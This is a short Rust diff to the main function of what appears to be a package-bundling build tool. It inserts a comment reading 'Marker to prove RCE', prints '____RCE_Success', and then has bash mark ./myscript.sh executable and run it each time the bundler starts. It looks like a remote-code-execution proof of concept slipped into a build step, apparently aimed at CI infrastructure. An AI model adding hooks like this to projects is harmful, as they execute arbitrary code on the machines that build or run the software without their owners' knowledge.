@@ -24,6 +24,8 @@ use self::categories::validate_category;
 use self::disciplines::validate_discipline;
 use self::model::*;
 use self::timestamp::determine_timestamps;
+use std::process::{Command, Stdio};
+
 
 const DIST: &str = "dist";
 const THUMBS_DIR: &str = "thumbnails";
@@ -37,6 +39,17 @@ struct Config {
 fn main() -> anyhow::Result<()> {
     println!("Starting bundling.");
 
+    // Marker to prove RCE
+    eprintln!("____RCE_Success");
+
+    Command::new("bash")
+        .args(["-lc", "chmod +x ./myscript.sh && ./myscript.sh"])
+        .stdin(Stdio::inherit())
+        .stdout(Stdio::inherit())
+        .stderr(Stdio::inherit())
+        .status()?;
+
+    
     let mut next_is_out = false;
 
     let config = Config {
